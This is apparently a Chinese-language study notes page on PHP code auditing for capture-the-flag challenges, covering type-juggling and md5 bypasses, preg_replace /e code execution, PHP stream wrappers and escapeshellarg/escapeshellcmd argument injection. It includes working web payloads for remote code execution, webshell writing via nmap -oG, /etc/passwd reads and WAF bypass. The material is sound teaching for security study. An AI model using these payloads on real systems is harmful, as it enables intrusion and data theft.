+++
title = 'php代码审计'
date = 2024-10-04T01:45:39+08:00
draft = false
categories = ['CS', 'sec']
+++


# 常见函数

## `is_numeric()`

判断是否为数字

```php
$var1 = 123;
$var2 = "3.14";
$var3 = "abc";
$var4 = "123abc";

echo is_numeric($var1);  // 输出：1（true）
echo is_numeric($var2);  // 输出：0（false）
echo is_numeric($var3);  // 输出：0（false）
echo is_numeric($var4);  // 输出：0（false）

```

---

## `intval()`

字符串转换成十进制整数

```php
echo intval("123");        // 输出: 123
echo intval("+123");       // 输出: 123
echo intval("123.45");     // 输出: 123
echo intval("123abc");     // 输出: 123
echo intval("abc123");     // 输出: 0
echo intval("12.3abc45");  // 输出: 12
```
- 如果字符串以数字开头，则为开头的数字 
- 如果字符串以非数字开头，则为0

### PHP5 的 intval 不识别科学计数

```php
if(intval($num) < 2020 && intval($num + 1) > 2021) {}
```

payload: `?num=100e2`  

在PHP5中， intval 不识别科学计数，遇到 e 直接结束，`intval("100e2")` 会被识别成 100 
- 后续版本中，科学计数字符串转数字时会被自动识别成相应数字

```php
echo intval(1e10); // 10000000000 
echo intval('1e10'); // 10000000000
```


### base 参数

```
int intval ( mixed $var [, int $base = 10 ] )
```


如果有第二个base参数 x，表示把第一个字符串参数看成x进制。

如果 base参数 = 0，通过检测 var 的格式来决定使用的进制：

- 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
- 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
- 将使用 10 进制 (decimal)。


## `show_source()`

显示指定文件的源代码

---
## `var_dump()`

打印变量的详细信息，包括变量的类型和值

---
## `scandir()`

获取指定目录

- `scandir(/)` 获取根目录

---

## `chr()`

将 ASCII 码转换为对应的字符
- 可拼接：`file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`

---

## `file_get_contents()`

获取指定路径的**文件的内容**

---

## `eval()`

将字符串作为php代码执行

**eval()是一个语言构造器，不能被可变函数调用**
```bash
eval(eval(...)) #错误
eval(assert(eval(...))) #正确

<?php assert(POST['a']) ;> #错误
#由于php版本问题，也不能直接用assert构造一句话，所以只能采用eval(assert(eval(...)))

```

---
## `sizeof`

返回**数组**长度

---
## `preg_match`

- [[../../../编程语言/正则表达式]]

```php
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
```

搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。

- $pattern: 要搜索的模式，可以是字符串或一个字符串数组。
- $replacement: 用于替换的字符串或字符串数组。
- $subject: 要搜索替换的目标字符串或字符串数组。

---
### /e 模式

**preg_replace** **/e** 模式下存在 RCE，php 7 被删除

#### 实战

注入环境：
```php
preg_replace( '/(' . $key . ')/ei', 'strtolower("\\1")', $value );
```
- key、value 是 GET 传入的键值对
- `/ei` 表示替换内容当作 php 执行


payload1：
```
 ?\S*=${phpinfo()}
```
- `\S` 利用 GET 上传的非法字符解析原理，解析成 `.` 
- `.*` 是 key，`${phpinfo()}` 是 value
- `.*` 贪婪匹配任意字符任意次，匹配 `${phpinfo()}`
- php 执行 `strtolower("{${phpinfo()}}")`
- 原理如下

payload2：
```php
?\S*=${eval($_POST[cmd])}
// 再 POST 一个参数 cmd=system("cat /flag");

// 或者解析一个题目给出的可以利用的函数
// function getFlag(){
//   	@eval($_GET['cmd']);
// }
?\S*=${getFlag()}&cmd=system("ls");

```

#### 原理

```php
var_dump(phpinfo()); // 结果：布尔 true

var_dump(strtolower(phpinfo()));// 结果：字符串 '1'
// 先执行 phpinfo 得到返回值是 1，再 strtolower("1") 返回值是 1 

var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'
// 先解析 {${phpinfo()}}，其中 phpinfo 返回 1， 解析得 {$1}
// var_dump(preg_replace('/(.*)/i','1','任意字符')); 返回 11

var_dump(preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}'));// 结果：空字符串''

var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'));// 结果：空字符串''
// 这里的'strtolower("{${phpinfo()}}")'执行后相当于 strtolower("{${1}}") 又相当于 strtolower("{null}") 又相当于 '' 空字符串
```

### php 正则反斜杠过滤问题

`preg_match` 匹配反斜杠需要四个反斜杠：

```php
preg_match("/\\\\/", $str1)
// preg_match("/\\/", $str1) 无效
```
- 原理：先由 php 解析器解析成`\\` ，再由正则匹配解析成`\`

再看一个特殊的：
```php
preg_match("/\\|\\\\/", $str2)
```
- 这个匹配的是 `|\`

先由 php 解析器解析为 `\|\\` ，再由正则解析为 `|\


---
# 技巧


## 读取文件新姿势

### highlight 高亮输出

highlight 高亮输出 + glob 搜索并返回第一个元素
```php
eval("highlight_file(glob("/f*")[0]);")
```
- highlight_file 是 php 的函数

### 无特殊字符的纯函数读取

```bash
# ls
scandir(current(localeconv()))
# localecnov() 函数返回一个包含本地数字及货币格式信息的数组。相当于Linux的ls
# current() 返回数组中当前元素的值
# scandir()就是列出目录中的文件和目录

# 打印
print_r();
print_r(scandir(current(localeconv())));
# 查看调试信息

# 定位
# array_reverse() 反转数组
# next() 指向下一个 (第二个)
next(array_reverse(scandir(current(localeconv()))))
# 此处指倒数第二个数组元素

# payload
# highlight 读取文件
highlight_file(next(array_reverse(scandir(current(localeconv())))));

```


---
## 弱比较

`==` 是PHP弱比较逻辑运算符

### 整数 和 字符串 的弱比较

尝试将字符串转换为整数，规则同 `intval()`，再比大小
- 123a == 123
- 例如，payload为123a可以绕过 is_numeric函数

### 弱比较和强比较的区别

```
==  和 !=  左右两边数据类型不同时，会将他们转化成同一格式进行比较。

=== 和 !== 左右两边数据类型不同时，则返回false
```

---
## 科学记数法

- 用于限制数字长度的题

1000000000 = 1e9

---

## 绕过md5

### 数组绕过

md5无法比较数组，对于数组，md5会返回NULL，所以相等，可以绕过比较
- 返回null，在强比较里面`null=null`也为 True，所以也可以绕过强比较

#### 实例
```php
<!--
$a = $_GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    //flag
-->
```

payload：
```
?a[]=1&b[]=2

# md5($a) == md5($b) returns true
```

### 科学计数绕过

- 只能绕过弱比较`==`，不能绕过`===`

原理：在 php 中，当字符串以0e开头时，会被 php 识别成==科学计数法==，结果均为0，因此在比较两个以 `0e` 开头的字符串时，无论后面的字符时是什么，比较结果都为 True。
- 所以关键在于找到md5值为0e开头的字符串

常用 MD5 值以 0e 开头的字符串：

| 字符串         | MD5 值                            |
| ----------- | -------------------------------- |
| QNKCDZO     | 0e830400451993494058024219903391 |
| s878926199a | 0e545993274517709034328855841020 |
| s155964671a | 0e342768416822451524974117254469 |
| s214587387a | 0e342768416822451524974117254469 |
| 0e215962017 | 0e291242476940776845150308577824 |
- 最后一个很特殊，**原字符串和 md5 值都是 0e 开头**，可以绕过 `md($a) == $a` 的情况
- 更多： [GitHub - spaze/hashes: Magic hashes – PHP hash "collisions"](https://github.com/spaze/hashes)


payload：
```
?a=QNKCDZO&b=s878926199a

# md5($a) == md5($b) returns true
```

### md5 碰撞

- [fastcoll](../工具/fastcoll.md)

找到两个真实的 md5 值一样的字符串绕过对字符串 md5 的强等于条件。

最终找到的两个 md5 值一样的字符串一般是乱码，需要经过 urlencode 再POST给服务器。
- hackbar 不能直接 post 经过 URL编码之后的数据，必须通过 burp 发包
- hackbar 直接输入的是原始数据，会在发包的时候经过一次 URL 编码，所以直接在 hackbar 输入 URL 编码之后的数据会再次被 URL 编码，导致出错


收集：
```
TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak
```


### 哈希长度拓展攻击

- 工具目录：`/Users/jz/Code/CTF/tools/attack-scripts/logic`

使用工具，攻击者能够根据**已知哈希值**、**原始消息长度**、结尾需要附加的**新数据**，计算出原始消息需要附加的**完整附加数据**以及**整个消息的新哈希值**。
- 原理：利用填充函数将消息扩展为压缩函数能处理的**固定长度的倍数**
- 所以不能仅仅附加需要的数据，只能做到以所要求的数据结尾
- ==原始消息需要附加的完整附加数据 是 包含结尾需要附加的新数据的**更长的字符串==**
- 在原始消息的基础上，不是仅仅附加了需要附加的新数据，是附加了一串**更长的数据**，需要附加的完整新数据最终可以做到以所要求的新数据结尾，所以整个完整的消息也是以所要求的新数据结尾


#### 判断 php 生成字符串长度

```php
$str = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
```
- randomb_bytes 生成 16 字节
- bin2hex 对每个字节生成两个16进制字符 得到32个字符
- 三个拼接得到96个字符

---
## php字符串解析特性

1. removes initial whitespace
2. converts some characters to underscore (including whitespace)

| USER INPUT    | DECODED | PHP VARIABLE NAME |
| ------------- | ------- | ----------------- |
| %20foo_bar%00 | foo_bar | foo_bar           |
| foo%20bar%00  | foo bar | foo_bar           |
| foo%5bbar     | foo[bar | foo_bar           |

### 绕过WAF

可以在用户输入时，利用字符串解析特性输入变形后的变量，导致php语法中可以正常检测到（传入的get/post）变量，同时，WAF等检测规则（waf等不具有php字符串解析特性）无法识别到相应黑名单/block规则中的变量，形成bypass

#### 实例

对于一个存在检测是否是数字的WAF，传入变量为num，可以构造payload：`?%20num=phpinfo()`
- `%20num` 在php语法中，被解析成`num`变量，进入后续的eval木马中执行相应的注入代码
- `%20num` 在WAF检测中，无法被解析成num，故对num的检测没有执行，发生bypass

---
## public、protected、private的区别

public 表示全局，类内部外部子类都可以访问；  
**private表示私有的，只有本类内部可以使用；  **
protected表示受保护的，只有本类或子类或父类中可以访问


---
## 魔术方法

PHP中把以两个下划线 `__` 开头的方法称为魔术方法(Magic methods)

```
__construct() 当一个对象创建时被调用，反序列化不触发
__destruct()  当一个对象销毁时被调用
__toString()  当一个对象被当作一个字符串使用，比如echo输出或用 . 和字符串拼接
__call()      当调用的方法不存在时触发
__invoke()    当一个对象被当作函数调用时触发
__wakeup()    反序列化时自动调用
__get()       类中的属性私有或不存在触发
__set()       类中的属性私有或不存在触发
```


---
## 非法参数名传参

- [谈一谈PHP中关于非法参数名传参问题\_arr4y非法传参-CSDN博客](https://blog.csdn.net/mochu7777777/article/details/115050295)
- 注意：只发送在PHP版本小于8时，当PHP版本大于等于8并不会出现以下介绍的转换错误

当变量名中出现 `.` 和 `空格` 时，PHP 会把它们转换成下划线

但是，如果参数中出现中括号`[`，中括号会被转换成下划线`_`，接下来如果该参数名中还有`非法字符` 并不会继续转换成下划线`_`，忽略后面所有错误。

#### 实例
```php
$zj = $_REQUEST['z j.'];

# 传入参数     $zj       实际变量
# ?z j.=1     NULL      z_j_
# ?z[j.=1     NULL      z_j.

```
- 当传入 `?z j.=1` 时，虽然 $zj 变量仍然是空的，但是存在 ` $_REQUEST['z_j_']` 
- `$_GET` 会自动对参数调用 urldecode，所以得到的参数键值对的数组中的值都是字符串。

---
## php 伪协议

伪协议是**一种特殊的协议，用于访问不同的数据源**。 

它们并不是真正的网络协议，而是一种封装协议，使得PHP能够以特定的方式**访问和操作数据**。 PHP提供了多种伪协议，每种伪协议都有其特定的用途和功能。


### file://

一般用于访问本地文件
- 绝对路径、相对路径、网络路径

```bash
?file=file:///etc/passswd

?url=/?url=file:///var/www/html/index.php # 访问index.php
```


### php://

访问各个输入输出流

常用： `php://filter` 用于**读取源码**，`php://input` 用于**执行php代码**

```bash
# base64 输出
php://filter/read=convert.base64-encode/resource=[文件名]
# 适用于 include 读文件

# 在数据流中写入 POST 的数据
php://input

# 读取实例
?cmd=php://filter/read=convert.base64-encode/resource=[文件名]
```


### data://

数据流封装器，以**传递相应格式的数据**。可以用来执行PHP代码。一般需要用到`base64编码`传输。

```
?file=data://text/plain,xxxx
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```


### 实例

```php
file_get_contents($text,'r')==="welcome to the zjctf"
```
- 要求从文件里读取字符串，与 welcome to the zjctf 相等

可以用 `data://` 和 `php://` 协议，将数据流重定向到用户可以控制的输入流

构造 payload:
```bash
?text=data://text/plain,welcome to the zjctf
# 相当于 封装了一个虚拟的文件 内容是 welcome to the zjctf

# 或者

?text=php://input 
# 同时 POST数据：welcome to the zjctf
```


---
## escapeshellarg 和 escapeshellcmd

### escapeshellarg

- [0x02 escapeshellarg为什么没有奏效？](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html#0x02-escapeshellarg)
- [浅谈escapeshellarg逃逸与参数注入 \[ Mi1k7ea \]](http://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/)

escapeshellarg 会给没有单引号的字符串加上单引号；对于有单引号的字符串，会先对单引号转义，再以单引号为分割，对各部分的字符串加上单引号。

测试功能：
```php
<?php
    $str1 = "ls";
    $str2 = "ls -al";
    $str3 = "ls'zj";    
    var_dump(escapeshellarg($str1));
    var_dump(escapeshellarg($str2));
    var_dump(escapeshellarg($str3));
?>
```

结果：
```
string(4) "'ls'"
string(8) "'ls -al'"
string(10) "'ls'\''zj'"
```


### escapeshellcmd

反斜线`\` 会在以下字符之前插入：
```
 &#;`|*?~<>^()[]{}$\   \x0A   \xFF
```
- 不成对的引号也会被转义
- 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替


测试：
```php
<?php
    $str1 = "ls";
    $str2 = "ls;";
    $str3 = "';ls;";    
    var_dump(escapeshellcmd($str1));
    var_dump(escapeshellcmd($str2));
    var_dump(escapeshellcmd($str3));
?>
```

结果：
```
string(2) "ls"
string(4) "ls\;"
string(8) "\'\;ls\;"
```


### 对于 arg + cmd 的参数注入

测试：
```php
<?php  
	$str1 = "zj' -l ";
	system(escapeshellcmd("ls --ignore=".escapeshellarg($str1)." /tmp"));  
	echo escapeshellcmd("ls --ignore=".escapeshellarg($str1)." /tmp");  
?>
```
- ignore 参数需要 linux 环境

结果：
![](../../../../img/Pasted%20image%2020241008025618.png)
- `ls --ignore='zj'\\'' -l \' /tmp` 可化简 `ls --ignore=zj\ -l ' /tmp`

当用户输入包含单引号时，先用 escapeshellarg() 处理会给该单引号添加转义符，再用 escapeshellcmd() 处理时会将该添加的转义符再添加一个转义符，从而导致注入内容可以从==shellarg的单引号中逃逸掉==，造成后续可以进一步利用的参数注入漏洞。
- 如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞



#### 实战： BUUCTF 2018---Online Tool

```php
<?php
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
?>
```

payload：
```
?host=2.2.2.2'<?php echo `cat /flag`;?> -oG test.php'
```
- -oG 是 nmap 的参数，表示写入前一个参数的内容到后一个参数所指明的文件中

---
## 变量覆盖

#### 例题

```php
<?php

include 'flag.php';
$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}

echo "the flag is: ".$flag;

?>
```

payload：
```
?is=flag&flag=flag
```

尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。

---


